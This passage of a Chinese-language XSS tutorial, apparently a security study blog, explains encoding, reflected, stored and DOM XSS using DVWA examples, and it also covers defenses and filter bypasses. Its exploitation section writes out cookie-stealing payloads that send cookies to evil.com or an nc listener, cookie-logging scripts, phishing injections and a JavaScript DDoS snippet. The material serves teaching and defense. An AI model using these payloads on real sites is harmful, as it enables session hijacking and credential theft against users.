onerror=alert(123)/&gt;&#39;)&quot;/&gt;</code></pre><p>假设document.write里的值是用户可控的输入,点击后,document.wirte出现一段img HTML,onerror里的JS会执行</p><p>来看一段HtmlEncode</p><pre><code>&lt;script&gt;function HtmlEncode(Str){    var s = &quot;&quot;     if(str.length == 0) return &quot;&quot;;    s = s.replace(/&amp;/g,&quot;&amp;amp;&quot;);    s = s.replace(/&lt;/g,&quot;&amp;lt;&quot;);    s = s.replace(/&gt;/g,&quot;&amp;gt;&quot;);    s = s.replace(/\&quot;/g,&quot;&amp;quot;&quot;);    return s;}&lt;/script&gt;&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&#39;&lt;img src=@ onerror=alert(123)/&gt;&#39;))&quot;/&gt;</code></pre><p> 这里</p><pre><code>HtmlEncode(&#39;&lt;img src=@ onerror=alert(123)/&gt;&#39;)后的结果为 &amp;it;img src=@ onerror=alert(123) /&amp;gt;</code></pre><p>然后点击之后就不会弹出123了</p><p>再看这个</p><pre><code>&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;doucument.write(&#39;&amp;lt;img src=@ onerror=alert(123) /&amp;gt&#39;)&quot; /&gt;</code></pre><p>点击这个就会弹出123了,这就是因为<strong>HTML自解码机制</strong> </p><p>onclick里的这段js代码出现在了HTML标签内,说明了这里的JS代码可以进行<strong>HTML形式的编码</strong></p><p>这种编码方式有两种</p><ul><li>进制编码:&#xH;(十六进制格式),&#D;(十进制格式),最后的分号(;)可以不要</li><li>HTML实体编码</li></ul><p>在JS代码执行之前,HTML形式的解码会自动解码</p><p>用户输入在script中</p><pre><code>&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt;    function $(id){return document.getElementById(id);};$(&#39;exec_btn&#39;).onclick = function(){    document.write(&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;);    //document.write(&#39;&amp;it;img src=@ onerror=alert(123) /&amp;gt;&#39;);};&lt;/script&gt;</code></pre><p>这样是可以执行弹窗的,如果输入的是注释中内容,这段HTML代码不会自解码,是因为用户输入的这段内容上下文环境是javascript,不是HTML(script标签里的内容与HTML环境无关),此时用户输入的内容要遵循javascript法则,即js编码</p><ul><li><p>Unicode形式, \uH(十六进制)</p></li><li><p>普通十六进制, \xH</p></li><li><p>纯转义 </p><pre><code>\&#39;,\&quot;,/&gt;,\&lt; 这种在特殊字符前加\进行转义</code></pre></li></ul><p>具备HtmlEncode功能的标签</p><pre><code>&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt;</code></pre><blockquote><p>更多JavaScript的知识以后再补充</p></blockquote><h1 id="0x02-什么是XSS"><a href="#0x02-什么是XSS" class="headerlink" title="0x02  什么是XSS"></a>0x02  什么是XSS</h1><p><img src="https://pic4.zhimg.com/80/73b69fceccc68ad467e08b04c39b2417_hd.jpg" alt></p><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序<strong>对用户的输入过滤不足而产生</strong>的。攻击者利用网站漏洞<strong>把恶意的脚本代码注入到网页中</strong>，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），<strong>诱使用户去访问一个包含恶意代码的 URL</strong>，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的<strong>搜索栏、用户登录口</strong>等地方，常用来<strong>窃取客户端 Cookies 或进行钓鱼欺骗</strong>。</p><p>反射型XSS输入点在URL上,什么是URL?看下面这张图就行了</p><p><img src="https://upload-images.jianshu.io/upload_images/1155692-865aa6e8904a0509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/918" alt></p><p>代码举例(DVWA Low)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Feedback for end user</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Hello '</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>可以看到,echo语句中,直接将GET到的参数name的值输出,并没有进行过滤,简单的输入name为这段JS代码</p><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>就会弹出窗口,内容为xss.这也是<strong>最简单</strong>的XSS测试语句</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先<strong>将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</strong>。持久型 XSS 一般出现在网站<strong>留言、评论、博客日志等交互处</strong>，恶意脚本存储到客户端或者服务端的数据库中。</p><p>甚至还可能出现在<strong>注册和修改密码</strong>中,比如极客大挑战就出了这种题</p><p>代码举例(DVWA Low)</p><pre class=" language-PHP"><code class="language-PHP"><?phpif( isset( $_POST[ 'btnSign' ] ) ) {    // Get input    $message = trim( $_POST[ 'mtxMessage' ] );    $name    = trim( $_POST[ 'txtName' ] );//去除空格    // Sanitize message input    $message = stripslashes( $message );//添加反斜杠    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escapemysqli_real_escape_string_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); //mysqli_real_escape_string转义特殊字符    // Sanitize name input    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Update database    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );//将输入的message和name插入进入数据库    //mysql_close();}?> </code></pre><p>可以看到,SQL语句仅仅做了一些简单的去除空格,删除,添加反斜杠,转义一些字符,并没有做太多对XSS的过滤,然后就把用户输入的内容插入到数据库,如果插入了一段恶意代码,就可能会导致XSS漏洞</p><p>在message处,输入</p><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;script&gt;</code></pre><p>就会弹窗,说明存在XSS,并且来回切换后,只要进入这个界面都会弹窗,说明是存储型XSS.</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM Based XSS simply means a Cross-site scripting vulnerability that appears <strong>in the DOM</strong> (<a href="http://en.wikipedia.org/wiki/Document_Object_Model" target="_blank" rel="noopener">Document Object Model</a>) instead of part of the HTML. <strong>In reflective and stored Cross-site scripting attacks you can see the vulnerability payload in the response page but in DOM based cross-site scripting, the HTML source code and response of the attack will be exactly the same</strong>, i.e. the payload cannot be found in the response. It can only be observed on runtime or by investigating the DOM of the page.</p><p>One of the biggest differences between DOM Based XSS and Reflected or Stored XSS vulnerabilities is that DOM Based XSS cannot be stopped by server-side filters. The reason is quite simple; <strong>anything written after the “#” (hash) will never be sent to the server.</strong></p><p>As a matter of fact, any other type of web protections such as web application firewalls, or generic framework protections like ASP.NET Request Validation will not protect you against DOM Based XSS attacks.</p><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，<strong>客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行</strong>。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p><p>比较容易出现DOM XSS的DOM资源</p><ul><li><p>document.URL</p></li><li><p>document.documentURI</p></li><li><p>location.href</p></li><li><p>location.search</p></li><li><p>location.*</p></li><li><p>window.name</p></li><li><p>document.referrer</p></li><li><p>HTML Modification sinks</p></li><li><ul><li>document.write</li><li>(element).innerHTML</li></ul></li><li><p>HTML modification to behaviour change</p></li><li><ul><li>(element).src (in certain elements)</li></ul></li><li><p>Execution Related sinks</p></li><li><ul><li>eval</li><li>setTimout / setInterval</li><li>execScript</li></ul><p>代码举例(DVWA Low)</p><pre><code>        &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;              &lt;select name=&quot;default&quot;&gt;                  &lt;script&gt;                      if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {                          var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);                          document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);                          document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);                      }                      document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);                      document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);                      document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);                      document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);                  &lt;/script&gt;              &lt;/select&gt;</code></pre><p>代码中说到没有做任何的保护措施,那么直接在URL中输入如下</p></li></ul><pre><code>  ?default=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>成功弹窗</p><p> 再来一个例子</p><pre><code>  &lt;script&gt;     document.write(&quot;&lt;b&gt;Current URL&lt;/b&gt; : &quot; + document.baseURI);  &lt;/script&gt;</code></pre><p>如果发送一个HTTP请求,</p><pre><code>http://www.example.com/test.html#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>成功弹窗,因为上面那个JS代码会将我们在URL中输入的任何内容写入(document.write),然后在右键查看源码中却看不到我们的payload,那就说明是DOM XSS.</p><p>实际上,除了构造一个新事件外,还可以选择闭合掉a标签,并插入一个新的HTML标签</p><pre><code>&#39;&gt;&lt;img src=# onerror=alert(&#39;xss&#39;) /&gt;&lt;&#39;</code></pre><p>实际页面代码变成了</p><pre><code>&lt;a href=&#39;&#39;&gt;&lt;img src=# onerror=alert(&#39;xss&#39;) /&gt;&lt;&#39;&#39;&gt;testLink&lt;/a&gt;</code></pre><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这个一般很难出现,但是也确实存在.在Flash中是可以嵌入ActionScript脚本的.一个最常见的Flash XSS可以这样写</p><p><code>getURL(&quot;javascript:alert(document.cookie)&quot;)</code></p><p>将Flash 嵌入页面中: </p><pre><code>&lt;embed src=&quot;http://host/evil.swf&quot;pluginspage=&quot;http://wwww.abc.com/test/download/index.cgi?P1_Prod_Version=ShockwaveFlash&quot;type=&quot;application/x-shockwave-flash&quot;width=&quot;0&quot;height=&quot;0&quot;&gt;&lt;/embed&gt;</code></pre><p>限制Flash动态脚本的最重要的参数是”allowScriptAccess”,这个参数定义了Flash能否与HTML页面进行通信.</p><h1 id="0x03-XSS利用"><a href="#0x03-XSS利用" class="headerlink" title="0x03 XSS利用"></a>0x03 XSS利用</h1><p>刚刚在上面已经提到过了,XSS最常利用的cookie窃取,钓鱼等.</p><h2 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h2><pre><code>&lt;script&gt;document.location=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookienew Image().src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie&lt;/script&gt;或者&lt;img src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie&gt;&lt;/img&gt;</code></pre><p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p><pre><code>&lt;%  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)  testfile=Server.MapPath(&quot;cookie.txt&quot;)  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)  set thisfile=fs.OpenTextFile(testfile,8,True,0)  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)  thisfile.close  set fs=nothing%&gt;</code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$cookie</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://192.168.118.138:1234/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>然后在kali的nc监听端口1234</p><p>nc -nvlp 1234</p><pre><code>http://localhost/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://192.168.118.138:1234/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>然后就会在kali上接收到数据包</p><p>成功窃取cookie之后,攻击者只需要在本地修改cookie为受害者的cookie即可登录对方账号.</p><h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><ul><li>重定向钓鱼</li></ul><pre><code>http://www.example.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></pre><ul><li>HTML注入钓鱼</li></ul><p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p><pre><code>http://www.example.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><ul><li>iframe钓鱼</li></ul><p>这种方式是通过</p><pre><code>&lt;iframe&gt;</code></pre><p>标签嵌入远程域的一个页面实施钓鱼。</p><pre><code>http://www.example.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</code></pre><ul><li>Flash钓鱼</li></ul><p>将构造好的恶意flash文件传入服务器,在目标网站用&lt;object或embed&gt;标签进行引用</p><ul><li>高级钓鱼技术</li></ul><p>注入代码劫持表单,用JS编写键盘记录等.</p><h2 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h2><p>什么是挂马?在网页中插入一段恶意代码,利用浏览器漏洞执行任意代码的攻击方式,在黑客圈子里形象的称为”挂马”</p><p>一般通过篡改网页来实现,如在XSS中使用</p><pre><code>&lt;iframe&gt;</code></pre><p>标签</p><h2 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h2><pre><code>&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;</code></pre><h2 id="DOS-与-DDOS"><a href="#DOS-与-DDOS" class="headerlink" title="DOS 与 DDOS"></a>DOS 与 DDOS</h2><ul><li>Dos</li></ul><p>代码举例(by Incapsula)</p><pre><code>// JavaScript Injection in &lt;img&gt; tag enabled by Persistent XSS&lt;img src=&quot;/imagename.jpg&quot;onload=&quot;$.getScript(&#39;http://c&amp;cdomain.com/index.html&#39;)&quot; /&gt;// Malicious JavaScript opens hidden &lt;iframe&gt;function ddos(url) {$(&quot;body&quot;).append(&quot;&lt;iframe id=&#39;ifr11323&#39; style=&#39;display:none;&#39;src=&#39;http://c&amp;cdomain.com/index.html&#39;&gt;&lt;/iframe&gt;&quot;);}//  Ajax DDoS tool in executes GET request every second&lt;html&gt;&lt;body&gt;&lt;h1&gt;Iframe&lt;/h1&gt;&lt;script&gt;ddos(&#39;http://www.target1.com/1.jpg&#39;,    &#39;http://www.target2.com/1.jpg&#39;);function ddos(url,url2){            window.setInterval(function (){                $.getScript(url);                $.getScript(url2);                        },1000)        }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>将恶意的代码注入到存在存储型XSS的网站上,如果网站的用户数量足够大,造成DOS攻击的概率也就越大</p><ul><li>DDos</li></ul><p>引用一篇Freebuf上的文章图片及部分内容</p><p>DDos攻击的成因是因为，攻击者可以在用户的自定义头像中插入恶意的javascript代码。所以当合法的用户访问这些存在漏洞的页面时(这些页面包含了攻击者的评论，评论中包含头像)，攻击者藏在头像中的恶意javascript代码就会被执行，这段代码向用户浏览器中插入一个隐藏的iframe，其地址指向DDos攻击者的C&amp;C服务器。</p><p><img src="https://image.3001.net/images/20140407/13968747583133.png!small" alt></p><h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><p>在中国,比较出名的XSS蠕虫,肯定会说新浪微博事件和百度贴吧事件.历史上第一个XSS蠕虫出现在2005年10月4日的Samy蠕虫.</p><p>XSS蠕虫是一种借助<a href="https://baike.baidu.com/item/Ajax/8425" target="_blank" rel="noopener">Ajax</a>技术实现对Web应用程序中存在的XSS漏洞进行自动化利用传播的蠕虫病毒，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p><h2 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h2><p>这里放一篇文章就好了……这个利用有点难,但是在一些CTF比赛中确实出现过,等遇见了再详细写一篇文章分析</p><p><a href="https://paper.seebug.org/34/" target="_blank" rel="noopener">XSS Tricks - 从 SelfXSS 到登录你的账户</a></p><p>Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。</p><ul><li>登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录</li></ul><p>这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作：</p><ol><li>恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload</li><li>JavaScript Payload 生成 `` 标签，并在框架内执行以下这些操作</li><li>让受害者登出攻击者的账号</li><li>然后使得受害者通过 CSRF 登录到自己的账户个人信息界面</li><li>攻击者从页面提取 CSRF Token</li><li>然后可以使用 CSRF Token 提交修改用户的个人信息</li></ol><p>这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；<strong>X-Frame-Options</strong> 需要被设置为同源（该页面可以在相同域名页面的 <code>iframe</code> 中展示 ）</p><ul><li>登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证</li><li>让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面</li><li>让用户登录我们的账户页面出现 XSS，利用 使用 `` 标签等执行恶意代码</li><li>登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session</li></ul><h1 id="0x04-XSS防御"><a href="#0x04-XSS防御" class="headerlink" title="0x04 XSS防御"></a>0x04 XSS防御</h1><p>XSS攻击的两大要素就是</p><ul><li>攻击者提交恶意代码</li><li>浏览器客户端执行恶意代码</li></ul><p>从XSS漏洞的成因就可以知道该怎么防御了,那就是不要太相信User的输入内容, 在一些关键位置可以禁用用户输入功能,在一些必须要用户输入的地方,可以使用相关函数来进行转义<strong>等操作来避免</strong>XSS攻击,下面来详细讲一讲</p><p><strong>转义</strong></p><ul><li>使用escapeHTML()函数进行转义一些语法特殊符号,使恶意代码不能正常解析(比如反斜杠,使恶意代码不能闭合)</li><li>htmlspecialchars()函数将&lt;&gt;转换为HTML实体</li><li>对于链接跳转,如 &lt;a href=”xxx” 或 location.href=”xxx”,要检验其中的内容,禁止以javascript: 开头的链接</li><li>使用escapeEmbedJSON()函数,对内联JSON进行转义</li><li>使用业界成熟通用的转义库</li></ul><p><strong>防御反射型和存储型XSS攻击</strong></p><ul><li>改成纯前端渲染,将<strong><em>代码与数据分离</em></strong></li><li>对HTML做充分转义</li></ul><blockquote><p>纯前端渲染的过程,浏览器先加载一个静态的HTML,该HTML中不包含任何跟业务相关的数据,然后浏览器执行HTML中的JS代码,JS通过Ajax加载业务数据,调用DOM API更新到页面上</p></blockquote><p><strong>防御DOM型XSS攻击</strong></p><p>在使用.innerHTML outerHTML document.wirte()时要额外小心,不把不可信的数据作为HTML插入到页面上,而应该尽量使用.textContent .setAttribute()等</p><p>DOM中内联事件的监听器,如location onclick onerror onload onmouseover等 a标签的href属性 ,JS的eval(),setTimeout(),setInterval()等,都能把字符串作为代码运行</p><p>使用这些时,容易产生安全隐患</p><p>举个例子</p><pre><code>&lt;script&gt;var x=&quot;$var&quot;;document.write(&quot;&lt;a href=&#39;&quot;+x+&quot;&#39; &gt;test&lt;/a&gt;&quot;);&lt;/script&gt;</code></pre><blockquote><p>当”$var”输出到script时,应该执行一次javascriptEncode;在document.write输出到HTML页面时,要具体情况具体对待,如果是输出到事件或者脚本,则要再做一次javascriptEncode;如果是输出到HTML内容或者属性,则要要一次HtmlEncode;</p></blockquote><p><strong>使用Content-Security-Policy</strong>(CSP,内容安全策略)</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li><li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><p><strong>对输入的内容长度进行限制</strong></p><p>这种措施,虽然不能完全防御XSS,但是能够增加XSS的难度</p><p><strong>HTTP-only Cookie</strong></p><p>禁止JavaScript读取某些敏感cookie,攻击者完成XSS后也无法窃取到cookie</p><p><strong>验证码</strong></p><p>防止脚本冒充用户提交危险操作,虽然有些简单的验证码方式现在也有技术能够绕过,但是也能够增加XSS的难度</p><p><strong>启用<em>白名单</em>或者黑名单,并且应该避免使用黑名单</strong></p><p><strong>几种输出的防御</strong></p><p>在HTML标签中/属性中输出,防御的方法是采用HtmlEncode</p><pre><code>&lt;div&gt;$var&lt;/div&gt;&lt;a href=# &gt;$var&lt;/a&gt;在属性中输出&lt;div id=&quot;abc&quot; name=&quot;$var&quot;&gt;&lt;/div&gt;</code></pre><p>攻击方法</p><pre><code>&lt;div id=&quot;abc&quot; name=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;&quot;&gt;&lt;/dvi&gt;</code></pre><p>在script标签中输出,在这种script标签中输出时,首先应该确保输出的变量在引号中</p><pre><code>&lt;script&gt;var x = &quot;&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/script&gt;</code></pre><p>攻击者需要先闭合引号才能实施XSS攻击</p><pre><code>&lt;script&gt;var x = &quot;&quot;;alert(/xss/);//&quot;;&lt;/script&gt;</code></pre><p>防御时使用javascriptEncode</p><p>在事件中输出</p><p>在事件中输出和在script标签中输出类似</p><pre><code>&lt;a href=# onclick=&quot;funcA(&#39;$var&#39;)&quot;&gt;test&lt;/a&gt;</code></pre><p>可能的攻击方法</p><pre><code>&lt;a href=# onclick=&quot;funcA(&#39;&#39;);alert(/xss/);//&#39;)&quot; &gt;test&lt;/a&gt;</code></pre><p>防御时,使用javascriptEncode</p><h1 id="0x05-XSS检测"><a href="#0x05-XSS检测" class="headerlink" title="0x05 XSS检测"></a>0x05 XSS检测</h1><ul><li>使用XSS语句手动检测</li><li>使用扫描工具自动检测XSS漏洞</li></ul><h1 id="0x06-XSS绕过"><a href="#0x06-XSS绕过" class="headerlink" title="0x06 XSS绕过"></a>0x06 XSS绕过</h1><ul><li><p>大小写绕过</p></li><li><p>编码绕过</p></li><li><p>自定义标签绕过, </p><pre><code>&lt;M/onclick=&quot;alert(1)&quot;&gt;M</code></pre></li><li><p>JSfuck绕过</p></li><li><p>使用多种能够触发执行javascript的标签来进行测试(有超过150中的方式来执行javascript代码的事件测试一个很少见的事件)</p></li></ul><pre><code>&lt;body/onhashchange=alert(&#39;xss&#39;)&gt;&lt;a href=#&gt;clickit</code></pre><ul><li>猥琐流代码</li></ul><p>我上面也只是一些思路(短短几个中文汉字是没法绕过的,知识如果遇见了就往上面的绕过方法想),下面的内容也就是上面的思路的实际例子</p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p><strong>/反斜杠可以用来代替空格</strong></p><p><strong>//为javascript的注释符</strong>,如果//被过滤,还可以使用逻辑与算术运算符来代替</p><p>1)先尝试插入正常的HTML标签,比如b,i,u这些来观察返回页面的情况是怎么样的,是否被HTML实体编码了,或者标签被过滤了</p><p>2)尝试插入不闭合的标签,比如&lt;b,&lt;i,&lt;u,&lt;marquee,&lt;script然后看一下返回情况,是不是对开放的标签页有过滤</p><p>3)然后测试几个payload,</p><pre><code>&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;prompt(1);&lt;/script&gt;&lt;script&gt;confirm(1);&lt;/script&gt;&lt;scriptsrc=&quot;http://rhainfosec.com/evil.js&quot;&gt;</code></pre><p>看返回情况,是过滤了全部,还是只过滤了一部分,是否留下了alert,prompt,confirm等字符,然后再尝试大小写绕过</p><pre><code>&lt;scRipt&gt;alert(&#39;xss&#39;)&lt;/scrIPT&gt;</code></pre><p>4)如果仅仅是把</p><pre><code>&lt;script&gt;和&lt;/script&gt;</code></pre><p>标签过滤,可以用下面这种方式来绕过</p><pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/scr&lt;script&gt;ipt&gt;</code></pre><p>5)使用&lt;a href标签进行测试,看返回的情况</p><pre><code>&lt;a 